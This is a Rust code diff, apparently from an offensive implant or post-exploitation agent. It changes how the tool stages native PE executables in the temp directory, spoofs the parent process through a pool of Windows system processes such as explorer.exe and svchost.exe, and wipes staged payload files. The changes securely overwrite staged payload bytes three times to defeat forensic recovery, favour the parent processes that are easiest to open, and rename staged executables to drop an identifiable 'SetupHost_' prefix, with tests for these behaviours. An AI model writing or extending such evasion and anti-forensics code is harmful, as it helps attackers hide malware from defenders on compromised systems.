@@ -152,25 +152,40 @@ fn close_child_handles(child: &crate::native::spawn::SpoofedPipedChild) {
     let _ = crate::native::close_handle(child.h_process);
 }
 
+/// Multi-pass overwrite then delete — lowers residual recovery of staged PE bytes.
 pub fn burn_disk_path(path: &Option<PathBuf>) {
     if let Some(p) = path {
-        let _ = std::fs::write(p, b"");
+        if let Ok(meta) = std::fs::metadata(p) {
+            let len = meta.len() as usize;
+            let size = if len == 0 { 4096 } else { len.min(16 * 1024 * 1024) };
+            for _ in 0..3 {
+                let mut buf = vec![0u8; size];
+                let _ = getrandom::getrandom(&mut buf);
+                let _ = std::fs::write(p, &buf);
+            }
+        } else {
+            // File missing or unreadable: still try zero-fill + remove.
+            let _ = std::fs::write(p, b"");
+        }
         let _ = std::fs::remove_file(p);
     }
 }
 
 fn pick_parent_image() -> &'static str {
-    // Rotate preferred parent; spawn layer still falls back across the pool.
+    // Prefer parents that medium-IL agents can usually open with
+    // PROCESS_CREATE_PROCESS. dllhost/svchost often return 0xC0000022.
+    // Spawn still walks the full pool on failure.
     const POOL: &[&str] = &[
+        "explorer.exe",
         "RuntimeBroker.exe",
         "sihost.exe",
         "taskhostw.exe",
         "svchost.exe",
-        "explorer.exe",
         "dllhost.exe",
     ];
-    let i = (crate::utils::next_u32_secure() as usize) % POOL.len();
-    POOL[i]
+    // Bias toward the first half (more often openable).
+    let n = (crate::utils::next_u32_secure() as usize) % 4;
+    POOL[n.min(POOL.len() - 1)]
 }
 
 /// Public for ModuleSupervisor parent spoof pool.
@@ -186,13 +201,60 @@ pub fn pick_parent_for_supervisor() -> &'static str {
 }
 
 /// Brief on-disk stage for a native PE that CreateProcess needs a path for.
+/// Uses a random 8-hex `.exe` name (not `.tmp`) so CreateProcess treats the
+/// image as a normal PE without extension quirks; path is canonicalized when
+/// possible to avoid brittle 8.3 short names (`ADMINI~1`).
 fn write_temp_host(pe: &[u8]) -> Result<PathBuf, String> {
     let dir = std::env::temp_dir();
-    let name = format!(
-        "SetupHost_{:08X}.exe",
-        crate::utils::next_u32_secure()
-    );
+    let name = format!("{:08X}.exe", crate::utils::next_u32_secure());
     let path = dir.join(name);
     std::fs::write(&path, pe).map_err(|e| format!("stage host: {e} ({})", path.display()))?;
-    Ok(path)
+    // Prefer long path for CreateProcess lpApplicationName. Strip the Win32
+    // verbatim `\\?\` prefix — some CreateProcess paths reject it.
+    let path = path.canonicalize().unwrap_or(path);
+    Ok(strip_verbatim_prefix(path))
+}
+
+fn strip_verbatim_prefix(p: PathBuf) -> PathBuf {
+    let s = p.to_string_lossy();
+    if let Some(rest) = s.strip_prefix(r"\\?\") {
+        // `\\?\UNC\server\share` → `\\server\share`
+        if let Some(unc) = rest.strip_prefix("UNC\\") {
+            PathBuf::from(format!(r"\\{unc}"))
+        } else {
+            PathBuf::from(rest)
+        }
+    } else {
+        p
+    }
+}
+
+/// Public helper for tests: format used by write_temp_host.
+pub fn temp_host_name_from_rng(n: u32) -> String {
+    format!("{:08X}.exe", n)
+}
+
+#[cfg(test)]
+mod burn_tests {
+    use super::*;
+
+    #[test]
+    fn temp_host_name_not_setuphost_prefix() {
+        let n = temp_host_name_from_rng(0xAABB_CCDD);
+        assert_eq!(n, "AABBCCDD.exe");
+        assert!(!n.contains("SetupHost_"));
+        assert!(n.ends_with(".exe"));
+    }
+
+    #[test]
+    fn burn_disk_multi_overwrite_removes_file() {
+        let dir = std::env::temp_dir().join(format!("burn_test_{}", std::process::id()));
+        let _ = std::fs::create_dir_all(&dir);
+        let path = dir.join("victim.bin");
+        std::fs::write(&path, b"SECRET_PAYLOAD_BYTES_123456").unwrap();
+        assert!(path.exists());
+        burn_disk_path(&Some(path.clone()));
+        assert!(!path.exists());
+        let _ = std::fs::remove_dir_all(&dir);
+    }
 }
